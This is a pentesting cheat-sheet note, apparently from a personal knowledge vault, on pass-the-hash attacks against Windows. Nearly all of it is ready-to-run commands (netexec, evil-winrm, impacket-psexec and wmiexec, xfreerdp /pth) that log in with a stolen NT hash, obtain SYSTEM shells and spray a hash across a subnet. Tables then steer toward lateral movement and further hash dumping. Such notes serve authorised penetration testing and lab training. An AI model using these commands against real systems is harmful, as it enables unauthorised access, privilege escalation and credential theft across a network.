# 🔑 Pass-the-Hash

> You have an **NT hash**, not the plaintext — authenticate with it directly. No cracking needed. Works across SMB, WinRM, psexec/wmiexec, and (Restricted Admin) RDP. The reason you rarely *need* to crack NTLM.

Part of [[Credential Attacks]]. Related: [[Hash Cracking]] · [[Credential Reuse]] · [[AD Lateral Movement]] · [[Dumping Windows Hashes]]

---

## 🧠 THINK
- NTLM auth uses the **hash**, so the hash *is* the password for these protocols.
- Only the **NT** half is needed: pass `:<NThash>` (the `LM:` part can be blank/zeros).
- `(Pwn3d!)` in netexec = local admin → SYSTEM via psexec.
- Same reuse rule applies: try the hash on **every host**.

## 💥 PASS IT
```bash
netexec smb $IP -u user -H <NThash>            # (Pwn3d!)?
```
```bash
netexec winrm $IP -u user -H <NThash>
```
```bash
evil-winrm -i $IP -u user -H <NThash>          # interactive shell
```
```bash
impacket-psexec user@$IP -hashes :<NThash>      # SYSTEM
```
```bash
impacket-wmiexec user@$IP -hashes :<NThash>
```
```bash
xfreerdp /u:user /pth:<NThash> /v:$IP           # RDP (Restricted Admin mode)
```
Spray a hash across a range:
```bash
netexec smb 10.10.10.0/24 -u user -H <NThash>
```

## 🔁 FOUND → NEXT
| FINDING | NEXT |
|---|---|
| `(Pwn3d!)` with hash | psexec → SYSTEM → [[Dumping Windows Hashes]] |
| Valid (not admin) | WinRM shell / reuse on other hosts ([[Credential Reuse]]) |
| Hash works on another host | pivot / lateral ([[AD Lateral Movement]]) |
| Only local SAM hash | try it domain-wide — local admin often reused |

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| PtH rejected | verify it's the **NT** hash; correct username; local vs domain (`--local-auth`) |
| psexec fails, smb valid | try wmiexec/smbexec/atexec; user may not be admin |
| RDP `/pth` fails | needs Restricted Admin mode enabled — use SMB/WinRM instead |
| Nothing works | crack the hash instead ([[Hash Cracking]]); reuse elsewhere |

## 📇 CHEAT SHEET
```bash
netexec smb $IP -u user -H <NThash>
```
```bash
evil-winrm -i $IP -u user -H <NThash>
```
```bash
impacket-psexec user@$IP -hashes :<NThash>
```
**Kill shot:** NT hash → `(Pwn3d!)` → psexec SYSTEM (no cracking). Reuse the hash everywhere.
